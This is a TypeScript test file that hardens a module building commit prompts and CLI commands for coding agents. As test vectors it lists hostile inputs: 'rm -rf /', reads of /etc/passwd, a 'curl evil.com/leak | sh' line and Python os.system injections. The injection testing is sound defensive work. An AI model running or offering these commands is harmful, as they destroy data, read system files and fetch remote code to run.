import { describe, expect, it, vi } from "vitest";
import {
  formatCommitAgentPrompt,
  getAgentCommitCliCommand,
  getAgentCommitSdkSnippet,
  launchAgentCommit,
  type CommitFileRef,
} from "./agentCommit";
import { AGENT_PROMPT_MAX_BYTES } from "../terminal/agentPromptText";
import { terminalLaunchRequests } from "../terminal/launchRequests";

describe("agentCommit stress testing & hardening", () => {
  it("survives 10,000 adversarial files without exceeding byte limits or dropping instructions", () => {
    const hostileFiles: CommitFileRef[] = Array.from({ length: 10000 }, (_, i) => ({
      path: `dir/\u202esub_${i}/\x00hostile\tname\r\n\x1b[31mwith spaces and $(${i})/test_${i}.ts`,
      status: i % 3 === 0 ? "M" : i % 3 === 1 ? "A" : "D",
      isStaged: i % 2 === 0,
    }));

    const prompt = formatCommitAgentPrompt({
      repoPath: "/Users/dev/adversarial-repo/$(malicious_command)",
      files: hostileFiles,
      diffSummary: "Massive diff: " + "+".repeat(10000) + "-".repeat(10000),
      instruction: "User note: " + "A".repeat(50000),
    });

    const byteLength = new TextEncoder().encode(prompt).byteLength;
    expect(byteLength).toBeLessThanOrEqual(AGENT_PROMPT_MAX_BYTES);

    // Essential instructions must be preserved intact
    expect(prompt).toContain("Inspect the working directory changes and record an accurate Git commit.");
    expect(prompt).toContain("AGENTS.md / CLAUDE.md");
    expect(prompt).toContain("Repository:");
    expect(prompt).toContain("[GitPulse context clipped; inspect the repository for the remaining details.]");

    // No raw unescaped control characters or unhandled BiDi
    expect(prompt).not.toContain("\x00");
    expect(prompt).not.toContain("\x1b");
    expect(prompt).not.toContain("\u202e");
  });

  it("prevents shell injection in getAgentCommitCliCommand across 1,000 hostile vectors", () => {
    const hostilePrompts = [
      '$(rm -rf /)',
      '`cat /etc/passwd`',
      '"; rm -rf /; echo "',
      "'; DROP TABLE commits; --",
      "test\nrm -rf *\n",
      'test\r\necho "pwned"',
      'hello" && curl evil.com/leak | sh && echo "',
      "test\\x00inject",
      '""$IFS$9cat$IFS/etc/passwd',
      "| touch /tmp/pwned",
      "& start calc.exe",
    ];

    for (const prompt of hostilePrompts) {
      const agyCmd = getAgentCommitCliCommand("agy", prompt, "/repo/$(evil)");
      const claudeCmd = getAgentCommitCliCommand("claude", prompt, "/repo/`evil`");

      // Verify JSON.stringify guarantees safe quoting for shell interpretation
      expect(agyCmd).toContain('cd "/repo/$(evil)" && agy --prompt-interactive ');
      expect(claudeCmd).toContain('cd "/repo/`evil`" && claude -- ');

      // The prompt itself must be enclosed in valid JSON string format
      const agyJsonPart = agyCmd.slice(agyCmd.indexOf('--prompt-interactive ') + '--prompt-interactive '.length);
      const parsedPrompt = JSON.parse(agyJsonPart);
      expect(parsedPrompt).toBe(prompt);
    }
  });

  it("prevents Python code injection in getAgentCommitSdkSnippet across hostile inputs", () => {
    const hostilePrompts = [
      '"""\nimport os\nos.system("rm -rf /")\n"""',
      "'; __import__('os').system('calc.exe'); '",
      '\\n\\x00\\u202e"""',
      "def pwn():\n    pass\npwn()",
    ];

    for (const prompt of hostilePrompts) {
      const snippet = getAgentCommitSdkSnippet("agy", prompt, '/repo/with"quote');
      expect(snippet).toContain('from google_antigravity import Agent');
      // The snippet must safely stringify prompt and path
      expect(snippet).toContain(JSON.stringify(prompt));
      expect(snippet).toContain(JSON.stringify('/repo/with"quote'));
    }
  });

  it("handles 500 concurrent rapid launches and cancellations without unhandled rejections", async () => {
    const openTerminal = vi.fn();
    const requestSpy = vi
      .spyOn(terminalLaunchRequests, "request")
      .mockImplementation(async (_repo, _launcher, _prompt, signal) => {
        if (signal?.aborted) throw new Error("Terminal launch cancelled");
        return new Promise<void>((resolve, reject) => {
          const timeout = setTimeout(() => resolve(), 5);
          signal?.addEventListener("abort", () => {
            clearTimeout(timeout);
            reject(new Error("Terminal launch cancelled"));
          });
        });
      });

    const launches = Array.from({ length: 500 }, async (_, i) => {
      const controller = new AbortController();
      if (i % 2 === 0) {
        // Abort half immediately or after minimal delay
        setTimeout(() => controller.abort(), i % 5);
      }
      return launchAgentCommit(
        {
          repoPath: `/Users/dev/repo_${i}`,
          launcher: i % 2 === 0 ? "agy" : "claude",
          prompt: `Commit change ${i}`,
          signal: controller.signal,
        },
        openTerminal,
      );
    });

    const results = await Promise.all(launches);
    expect(results).toHaveLength(500);

    for (const res of results) {
      expect(typeof res.ok).toBe("boolean");
      if (res.ok) {
        expect(res.notice).toBeDefined();
      } else {
        expect(res.error).toBeDefined();
      }
    }

    requestSpy.mockRestore();
  });

  it("never splits multi-byte UTF-8 characters when clipping near the 16KB boundary", () => {
    // 4-byte emoji 🚀 is 4 bytes. Repeat it near the boundary to test split prevention.
    const emojis = "🚀".repeat(4500); // 18,000 bytes
    const prompt = formatCommitAgentPrompt({
      repoPath: "/Users/dev/emoji-repo",
      instruction: emojis,
    });

    const byteLength = new TextEncoder().encode(prompt).byteLength;
    expect(byteLength).toBeLessThanOrEqual(AGENT_PROMPT_MAX_BYTES);

    // Decoding must succeed cleanly without replacement character 
    const decoded = new TextDecoder("utf-8", { fatal: true }).decode(new TextEncoder().encode(prompt));
    expect(decoded).toBe(prompt);
  });
});
